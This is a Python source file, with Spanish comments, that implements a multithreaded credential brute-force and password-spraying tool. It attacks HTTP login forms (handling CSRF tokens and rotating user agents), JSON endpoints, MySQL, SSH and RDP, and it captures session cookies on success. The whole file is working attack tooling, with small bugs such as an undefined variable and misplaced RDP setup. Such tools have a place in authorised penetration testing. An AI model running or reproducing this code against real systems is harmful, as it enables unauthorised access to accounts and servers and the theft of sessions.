#!/usr/bin/python3
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from bs4 import BeautifulSoup
from sukolib import *
#import argparse
import time
import random
import mysql.connector
import paramiko
from mysql.connector import Error
import rdp
import urlsuko


formatos=['console','csv','json','xml']

'''
DESC: Función para hacer fruerza bruta en fromularios HTTP con token CRSF
      * genera el payload
      * Intenta Login: Si es correcto devuelve True y una tupla con:+
         - URL
         - Ususario
         - Password
         - COOKIE de la sesion generada
        si el login no es corecto devuelve False

INPUT: parms: Diccionario con los datos necesarios para el login: (url, y estructura del payload)
       verbose: indica la verbosidad de la ejecución del comando
'''
def brute_force_http(parms,verbose):
   payload_fields=parms['payload_fields']
   payload = {
            payload_fields['username']: parms['user'],
            payload_fields['password']: parms['password'],
            payload_fields['login']: 'Login'}
   u=urlsuko.urlsuko(parms['url_login'])
   u.set_uagent(random.choice(parms['user_agent']))
   status,post_response,cookies=u.login(payload,payload_fields['user_token'],verbose=verbose)
   if status:
    found=parms['mensaje'] not in post_response.text
    if verbose:
        print (messg(f"{payload} ::: {found}",'DEBUG','green'))
    if found and verbose:
       if post_response.history:
        for resp in post_response.history:
            print (messg(f"{resp.status_code} : {resp.request.headers}",'DEBUG','green'))
    return found,(parms['url_login'],parms['user'],parms['password'],str(cookies.get_dict()))
   else:
       if verbose:
          print (post_response)
       return False,("NONE","NONE","NONE")

'''
'''
def brute_force_http_redirect(parms,verbose):
   payload_fields=parms['payload_fields']
   payload = {
            payload_fields['username']: parms['user'],
            payload_fields['password']: parms['password'],
            payload_fields['login']: 'Login'}
   u=urlsuko.urlsuko(parms['url_login'])
   u.set_uagent(random.choice(parms['user_agent']))
   status,post_response,cookies=u.login(payload,payload_fields['user_token'],verbose=verbose)
   found=parms['mensaje'] not in post_response.url
   if verbose:
       print (messg(f"{parms['url_login']} --> {post_response.url} ::: {payload} ::: {found}",'DEBUG','green'))
   #return found,(parms['url_login'],parms['user'],parms['password'],str(session.cookies.get_dict()))
   return found,(parms['url_login'],parms['user'],parms['password'],str(cookies.get_dict()))

'''
'''
#def brute_http_json(parms,verbose):
    #found=False
    #payload_fields=parms['payload_fields']
    #payload = {
    #        payload_fields['username']: parms['user'],
    #        payload_fields['password']: parms['password'],
    #}
    #try:
    #    headers = {"Content-Type": "application/json"}
    #    resp = requests.post(parms['url_login'], json=payload, headers=headers)
    #except Exception as e:
    #    if verbose:
    #       print(messg(f"Error {e} accediendo a {parms['url_login']}"))
    #       print (messg(f"{payload} ::: {found}",'DEBUG','green'))
    #    return found,(parms['url_login'],parms['user'],parms['password'])
    #found=(resp.status_code == 200) and (parms["mensaje"] in resp.text)
    #if verbose:
    #   print (messg(f"{payload} ::: {found}",'DEBUG','green'))
    #return found,(parms['url_login'],parms['user'],parms['password'],"")
    ##return found,(parms['url_login'],parms['user'],parms['password'],str(cookies.get_dict()))

def brute_http_json(parms,verbose):
    found=False
    payload_fields=parms['payload_fields']
    payload = {
            payload_fields['username']: parms['user'],
            payload_fields['password']: parms['password'],
    }
    try:
        headers = {"Content-Type": "application/json"}
        resp = requests.post(parms['url_login'], json=payload, headers=headers)
    except Exception as e:
        if verbose:
           print(messg(f"Error {e} accediendo a {parms['url_login']}"))
           print (messg(f"{payload} ::: {found}",'DEBUG','green'))
        return found,(parms['url_login'],parms['user'],parms['password'])
    found=(resp.status_code == 200) and (not (parms["mensaje"] in resp.text))
    if found:
        resp_data=resp.json()
    else:
        resp_data=""
    if verbose:
       print (messg(f"{payload} ::: {found}",'DEBUG','green'))
    #return found,(parms['url_login'],parms['user'],parms['password'],"")
    return found,(parms['url_login'],parms['user'],parms['password'],resp_data)
'''
'''
def brute_mysql(parms,verbose):
    connect_string=parms['url_login'].split(':')
    SERVER=connect_string[0]
    if len(connect_string)>1:
       PORT=connect_string[1]
    else:
       PORT=3306
    try:
        conx = mysql.connector.connect(host=SERVER,
                                       port=PORT,
                                       user=parms['user'],
                                       password=parms['password'])
        if conx.is_connected():
            conx.close()
            return True,(parms['url_login'],parms['user'],parms['password'])
    except Error as e:
        if verbose:
            print (messg(f"Usuario: {parms['user']} <--> password: {parms['password']} ## Error: {e}",'DEBUG','red'))
        return False,("NONE","NONE","NONE") 
'''
'''
def brute_ssh (parms,verbose):
    connect_string=parms['url_login'].split(':')
    SERVER=connect_string[0]
    if len(connect_string)>1:
       PORT=connect_string[1]
    else:
       PORT=22
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
      ssh.connect(
       hostname=SERVER,
       username=parms['user'],
       password=parms['password'],
       port=PORT
      )
    except Exception as e:
        if verbose:
            print (messg(f"Usuario: {parms['user']} <--> password: {parms['password']} ## Error: {e}",'DEBUG','red'))
        return False,("NONE","NONE","NONE") 
    ssh.close()
    return True,(parms['url_login'],parms['user'],parms['password'])

'''
'''
def brute_rdp (parms,verbose):
    connect_string=parms['url_login'].split(':')
    SERVER=connect_string[0]
    if len(connect_string)>1:
       PORT=connect_string[1]
    else:
       PORT=3389
       c=rdp.rdp(SERVER,parms['user'],parms['password'],PORT)
    if c.ping():
       return c.try_connect(),(parms['url_login'],parms['user'],parms['password'])
    else:
       return False,("NONE","NONE","NONE") 



'''
'''
functions={'http':brute_force_http,'http_redirect':brute_force_http_redirect,'http_json':brute_http_json,'mysql':brute_mysql,'ssh':brute_ssh,'rdp':brute_rdp}
'''
'''
def procesar_hilo(protocol,parms,user,password):    
        parms['user']=user
        parms['password']=password
        return functions[protocol](parms,False)

class finBusqueda(Exception):
    pass





'''
'''
def bruteList(users_file,passwords_file,spraying,emptypw):
 user_pw=[]
 try:
  with open(users_file, 'r') as f:
       users = [line.strip() for line in f.readlines()]
 except Exception as e:
     print (messg(f"Error {e} abriendo el fichero {users_file}",'-','red'))
     return user_pw
 try:    
  with open(passwords_file, 'r') as f:
     passwords = [line.strip() for line in f.readlines()]
 except Exception as e:
     print (messg(f"Error {e} abriendo el fichero {password_file}",'-','red'))
     return user_pw

 if emptypw:
     passwords.append("")

 if spraying:
    for user in users:
        for password in passwords:
            user_pw.append((user,password))
 else:
    for password in passwords:
        for user in users:
            user_pw.append((user,password))
 return user_pw

def bruteforce(user_pw,stop,parms,protocol,delay,verbose):

 encontrados=[]

 for pair in user_pw :
        parms['user']=pair[0]
        parms['password']=pair[1]
        found=functions[protocol](parms,verbose)
        if found[0]:
            encontrados.append(found[1])
        if stop and found[0]:
            break
        time.sleep(delay)
 return encontrados       

def bruteforceMT(user_pw,stop,parms,protocol,threads,verbose):

 encontrados=[]
 pruebas=[]
 with ThreadPoolExecutor(max_workers=threads) as executor:
    resultados = [
        executor.submit(procesar_hilo, protocol, parms, pair[0], pair[1] )
        for pair in user_pw
    ]
    for intento in as_completed(resultados):
        resultado=intento.result()
        pruebas.append(resultado)
        if resultado[0]:
            encontrados.append(resultado[1])
 return encontrados       

#def main():
# print(parms)
# userpwList=bruteList(users_file,passwords_file, args.spraying,args.empty)
# encontrados=bruteforce(userpwList,args.stop,parms,args.protocol,args.verbose)
# print (encontrados)

#main()

